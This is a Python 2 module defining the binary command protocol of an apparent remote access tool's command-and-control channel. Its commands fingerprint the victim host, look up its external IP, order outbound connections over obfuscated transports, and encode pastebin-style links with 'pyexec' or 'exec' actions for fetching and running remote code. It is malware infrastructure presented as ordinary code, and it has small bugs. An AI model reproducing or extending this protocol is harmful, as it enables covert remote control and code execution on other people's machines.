import struct
import netaddr
import re
import base64
import baseconv
import binascii
import time
import datetime
import platform
import uuid
import uptime
import urllib2

def from_bytes(bytes):
    return sum(ord(byte) * (256**i) for i, byte in enumerate(bytes))

def to_bytes(value):
    value = long(value)
    bytes = []
    while value:
        bytes.append(chr(value % 256))
        value = value >> 8
    return ''.join(bytes)

class Command(object):
    session_required = False
    internet_required = False

    def pack(self):
        return b''

    @staticmethod
    def unpack(data):
        return Command(), 0

class Poll(Command):
    @staticmethod
    def unpack(data):
        return Poll(), 0

    def __repr__(self):
        return '{POLL}'

class Idle(Command):
    @staticmethod
    def unpack(data):
        return Idle(), 0

    def __repr__(self):
        return '{IDLE}'

class Exit(Command):
    @staticmethod
    def unpack(data):
        return Exit(), 0

    def __repr__(self):
        return '{EXIT}'

class Disconnect(Command):
    @staticmethod
    def unpack(data):
        return Disconnect(), 0

    def __repr__(self):
        return '{DISCONNECT}'

class Policy(Command):
    def __init__(self, poll, kex, timestamp=None):
        self.timestamp = timestamp or time.time()
        self.poll = poll
        self.kex = kex

    def pack(self):
        field = (int(bool(self.kex)) << 31) | (self.poll & ((1<<30)-1))
        return struct.pack('>II', field, self.timestamp)

    def __repr__(self):
        return '{{POLICY: POLL={} TIME={} KEX={}}}'.format(self.poll, self.timestamp, self.kex)

    @staticmethod
    def unpack(data):
        field, timestamp = struct.unpack_from('>II', data)
        kex = (field >> 31) & 1
        poll = field & ((1<<30)-1)
        return Policy(poll, kex, timestamp), 8

class Kex(Command):
    def __init__(self, parcel):
        self.parcel = parcel

    def pack(self):
        return struct.pack('B',len(self.parcel)) + self.parcel

    def __repr__(self):
        return '{{KEX: Q={}, SPI={:08x}}}'.format(binascii.b2a_hex(self.parcel), self.spi)

    @property
    def spi(self):
        return struct.unpack('>I', self.parcel[0:4])[0]

    @staticmethod
    def unpack(data):
        length = struct.unpack_from('B', data)[0]
        return Kex(data[1:1+length]), 1+length

class SystemInfo(Command):
    session_required = True

    # To do, add more? Who knows how platform.uname looks like on other platforms?
    # How many are there? Let's use 3 bits for that - 8 systems in total
    well_known_os_names_decode = dict(enumerate([
        'Linux', 'Windows'
    ]))
    well_known_os_names_encode = {
        v:k for k,v in well_known_os_names_decode.iteritems()
    }
    # Same question.
    well_known_cpu_archs_decode = dict(enumerate([
        'x86', 'i386', 'x86_64', 'AMD64'
    ]))
    well_known_cpu_archs_encode = {
        v:k for k,v in well_known_cpu_archs_decode.iteritems()
    }

    def __init__(
            self, system=None, arch=None,
            node=None, external_ip=None,
            internet=False, boottime=None
        ):
        self.system = system or platform.system()
        self.arch = arch or platform.machine()
        self.node = node or uuid.getnode()
        try:
            self.boottime = boottime or uptime.boottime()
        except:
            self.boottime = datetime.datetime.fromtimestamp(0)

        self.internet = bool(internet)
        self.external_ip = external_ip
        if external_ip is not None:
            if external_ip in ['0.0.0.0', u'0.0.0.0', 0, netaddr.IPAddress('0.0.0.0')]:
                self.external_ip = None
            else:
                self.external_ip = netaddr.IPAddress(external_ip)
        else:
            proxy = urllib2.ProxyHandler()
            opener = urllib2.build_opener(proxy)
            opener.addheaders = [('User-agent', 'curl/7.50.0')]
            response = opener.open('http://ifconfig.co')
            if response.code == 200:
                self.external_ip = netaddr.IPAddress(response.read())
                self.internet = True

    def pack(self):
        # 3 bits for system, 3 bits for arch, 1 bit for internet
        osid = self.well_known_os_names_encode[self.system]
        archid = self.well_known_cpu_archs_encode[self.arch]
        block = osid << 4 | archid << 1 | int(bool(self.internet))
        boottime = int(time.mktime(self.boottime.timetuple()))
        return struct.pack('B', block) + to_bytes(self.node) + \
          struct.pack('>II', int(self.external_ip or 0), boottime)

    def get_dict(self):
        return {
            'os': self.system,
            'arch': self.arch,
            'node': self.node,
            'external_ip': self.external_ip,
            'internet': self.internet,
            'boottime': self.boottime
        }

    def __repr__(self):
        return '{{SYS: OS={} ARCH={} NODE={:12x} IP={} INTERNET={} BOOT={}}}'.format(
            self.system, self.arch, self.node, self.external_ip, self.internet, self.boottime.ctime()
        )

    @staticmethod
    def unpack(data):
        block, node, rest = data[:1], data[1:1+6], data[1+6:1+6+8]
        block = ord(block)
        osid = (block >> 4) & 7
        archid = (block >> 1) & 7
        internet = bool(block & 1)
        node = from_bytes(node)
        ip, boottime = struct.unpack('>II', rest)
        boottime = datetime.datetime.fromtimestamp(boottime)
        ip = netaddr.IPAddress(ip)

        return SystemInfo(
            system=SystemInfo.well_known_os_names_decode[osid],
            arch=SystemInfo.well_known_cpu_archs_decode[archid],
            internet=internet,
            external_ip=ip,
            boottime=boottime
        ), 1+6+8

class Connect(Command):
    well_known_transports_decode = dict(enumerate([
        'obfs3','udp','http','tcp_cleartext','rsa',
        'ssl','udp_cleartext','scramblesuit','ssl_rsa'
    ], 1))

    well_known_transports_encode = {
        v:k for k,v in well_known_transports_decode.iteritems()
    }

    def __init__(self, ip, port, transport='ssl'):
        self.transport = transport
        self.ip = ip
        self.port = port

    def pack(self):
        message = b''
        if self.transport in self.well_known_transports_encode:
            code = (1 << 7) | self.well_known_transports_encode[self.transport]
            message = message + struct.pack('B', code)
        else:
            if len(self.transport) > 24:
                raise ValueError('Transport name is too large')
            else:
                code = len(self.transport)
            message = message + struct.pack('B', code) + self.transport

        message = message + struct.pack('>I', int(netaddr.IPAddress(self.ip)))
        message = message + struct.pack('>H', int(self.port))

        return struct.pack('B', len(message)) + message

    def __repr__(self):
        return '{{CONNECT: TRANSPORT={} IP={} PORT={}}}'.format(
            self.transport, self.ip, self.port
        )

    @staticmethod
    def unpack(data):
        length = struct.unpack_from('B', data)[0]
        data = data[1:1+length]
        transport, rest = data[:1], data[1:]
        transport = struct.unpack('B', transport)[0]
        if transport & 1<<7:
            transport = Connect.well_known_transports_decode[transport & (1<<7)-1]
        else:
            transport, rest = rest[:transport], rest[transport:]

        host, port = rest[:4], rest[4:]
        host = str(netaddr.IPAddress(struct.unpack('>I', host)[0]))
        port = struct.unpack('>H', port)[0]

        return Connect(host, port, transport), 1+length

class PasteLink(Command):
    internet_required = True

    # 15 max - 4 bits
    well_known_paste_services = [(
        'http://pastebin.com/raw/{}',
        base64.b64decode,
        base64.b64encode,
    ), (
        'http://beta.pastee.com/api/get/{}/raw',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    ), (
        'http://ix.io/{}',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    ), (
        'http://paste.ee/r/{}',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    ), (
        'http://hastebin.com/raw/{}',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    ), (
        'http://pastie.org/pastes/{}/download',
        lambda x: to_bytes(long(x)),
        lambda x: str(from_bytes(x)),
    ), (
        'http://dpaste.com/{}.txt',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    ), (
        'http://climbi.com/static/{}-0.txt',
        lambda x: to_bytes(long(x)),
        lambda x: str(from_bytes(x)),
    ), (
        'https://friendpaste.com/{}/raw',
        lambda x: to_bytes(baseconv.base62.decode(x)),
        lambda x: baseconv.base62.encode(from_bytes(x)),
    )]

    well_known_paste_services_encode = {
        k:i for i, k in enumerate(well_known_paste_services)
    }

    well_known_paste_services_decode = {
        i:k for k,i in well_known_paste_services_encode.iteritems()
    }

    # 4 max - 2 bits
    well_known_pastebin_action_decode = dict(enumerate([
        'pyexec', 'exec'
    ]))

    well_known_pastebin_action_encode = {
        v:k for k,v in well_known_pastebin_action_decode.iteritems()
    }

    def __init__(self, url, action='pyexec'):
        self.url = url
        self.action = action

    def pack(self):
        message = b''

        well_known_found = False

        if not self.action in self.well_known_pastebin_action_encode:
            raise ValueError('User-defined actions are not supported')

        for (service, encode, decode), code in self.well_known_paste_services_encode.iteritems():
            match = re.match(service.format('(.*)'), self.url)
            if match:
                paste = encode(match.groups()[0])
                message = struct.pack(
                    'BB',
                    (1<<7) | (self.well_known_pastebin_action_encode[self.action] << 5) | code,
                    len(paste)
                ) + paste
                well_known_found = True
                break

        if not well_known_found:
            if len(self.url) > 32:
                raise ValueError('Url size of user-defined urls limited to 25 bytes')

            message = struct.pack(
                'B',
                self.well_known_pastebin_action_encode[self.action] << 5 | len(self.url)
            ) + self.url

        return message

    def __repr__(self):
        return '{{PASTE: URL={} ACTION={} }}'.format(
            self.url, self.action
        )

    @staticmethod
    def unpack(data):
        h1 = struct.unpack_from('B', data)[0]
        if h1 & (1<<7):
            action = PasteLink.well_known_pastebin_action_decode[(h1 >> 5) & 3]
            urltpl, encode, decode = PasteLink.well_known_paste_services_decode[h1 & 7]
            _, length = struct.unpack_from('BB', data)
            url = urltpl.format(decode(data[2:2+length]))
            return PasteLink(url, action), 2+length
        else:
            action = PasteLink.well_known_pastebin_action_decode[(h1 >> 5) & 3]
            length = h1 & 31
            return PasteLink(data[1:length+1], action), 1+length


class Error(Command):
    errors = [
        'NO_ERROR',
        'NO_SESSION',
        'NO_COMMAND',
        'NO_POLICY',
        'CRC_FAILED',
        'EXCEPTION'
    ]

    errors_decode = dict(enumerate(errors))
    errors_encode = {v:k for k,v in errors_decode.iteritems()}

    def __init__(self, error, message=''):
        self.error = error
        self.message = message

    def pack(self):
        if len(self.message) > 25:
            raise ValueError('Message too big')

        return struct.pack('B', self.errors_encode[self.error] << 5 | len(self.message))+self.message

    def __repr__(self):
        return '{{{}{}}}'.format(self.error, ': '+self.message if self.message else '')

    @staticmethod
    def unpack(data):
        header = ord(data[0])
        code = (header >> 5) & 7
        length = header & 31
        return Error(Error.errors_decode[code], data[1:1+length]), 1+length


class ParcelInvalidCrc(Exception):
    @property
    def error(self):
        return Error('CRC_FAILED')

class ParcelInvalidPayload(Exception):
    @property
    def error(self):
        return Error('CRC_FAILED')

class ParcelInvalidCommand(Exception):
    def __init__(self, command):
        self.command = command

    def __repr__(self):
        return 'Unknown command: {}'.format(command)

class Parcel(object):
    # Explicitly define commands. In other case make break something
    commands = [
        Poll, Policy, Idle, Kex,
        Connect, PasteLink, SystemInfo, Error, Disconnect, Exit
    ]

    commands_decode = dict(enumerate(commands))
    commands_encode = { v:k for k,v in commands_decode.iteritems() }

    def __init__(self, *commands):
        if not all((type(command) in self.commands) for command in commands):
            missing = [ command for command in commands if not type(command) in self.commands ]
            raise ParcelInvalidCommand(missing)

        self.commands = commands

    def __iter__(self):
        return iter(self.commands)

    def __len__(self):
        return len(self.commands)

    def pack(self):
        data = b''.join([
            chr(self.commands_encode[type(command)]) + command.pack() for command in self.commands
        ])
        crc = binascii.crc32(data)
        return struct.pack('>i', crc) + data

    def __repr__(self):
        return str(self.commands)

    @staticmethod
    def unpack(data):
        messages = []

        try:
            crc, data = struct.unpack_from('>i', data)[0], data[4:]
        except struct.error:
            raise ParcelInvalidPayload

        if not binascii.crc32(data) == crc:
            raise ParcelInvalidCrc

        while data:
            command, data = data[:1], data[1:]
            cmd, offt = Parcel.commands_decode[ord(command)].unpack(data)
            messages.append(cmd)
            data = data[offt:]

        return Parcel(*messages)
